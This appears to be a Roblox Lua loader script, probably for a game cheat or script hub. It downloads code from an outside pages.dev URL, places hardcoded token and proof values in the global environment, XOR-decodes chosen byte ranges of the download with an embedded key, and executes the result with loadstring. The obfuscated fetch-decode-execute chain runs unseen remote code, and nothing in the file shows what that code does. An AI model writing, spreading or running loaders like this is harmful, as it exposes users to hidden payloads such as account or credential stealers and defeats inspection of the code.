local U = "https://ac-nametag-cfg-7k3m.pages.dev/api/script?ot=517ce019b366ed3ac71fcdba88eb5848354d9344292ac448"
local P = {102,160,40,225,45,105,91,23,233,135,192,31,206,145,92,30,15,81,103,12,66,28,10,87,201,127,211,140,28,216,182,130}
local K = ""
local src = game:HttpGet(U)
do
	local g = (type(getgenv) == "function" and getgenv()) or getfenv() or _G
	g.VX_TOKEN = "794db2256bf6f179c7f2d7d8a4d76ae1"
	g.VX_RELEASE = "ad267b4316f1e453d335e2068688c34e"
	g.VX_NONCE = "ea6bb8c3c508c6afcc87b6c0b93a88a4"
	g.VX_PROOF = "25353c8286145186de04be0fc4bc943a1c479e21b333729693eb26e38eca8011"
end
local function wx(s, a, n)
	if a < 1 then a = 1 end
	if a + n - 1 > #s then n = #s - a + 1 end
	if n < 1 then return s end
	local b = table.pack(string.byte(s, a, a + n - 1))
	for i = 1, n do b[i] = bit32.bxor(b[i], P[(i - 1) % #P + 1]) end
	return s:sub(1, a - 1) .. string.char(unpack(b, 1, n)) .. s:sub(a + n)
end
do
	local n = #src
	src = wx(src, 1, 96)
	local off = 65536
	if n > 131840 then
		off = 65536 + (P[1] + P[2] * 256 + P[3] * 65536 + P[4] * 16777216) % (n - 131584)
	elseif n > 448 then
		off = 224
	else
		off = 1
	end
	src = wx(src, off, 224)
	src = wx(src, n - 95, 96)
end
if type(getgenv) == "function" and K ~= "" then getgenv().AC_ACKEY = K end
local fn, err = loadstring(src)
if not fn then error("loader failed: " .. tostring(err)) end
return fn()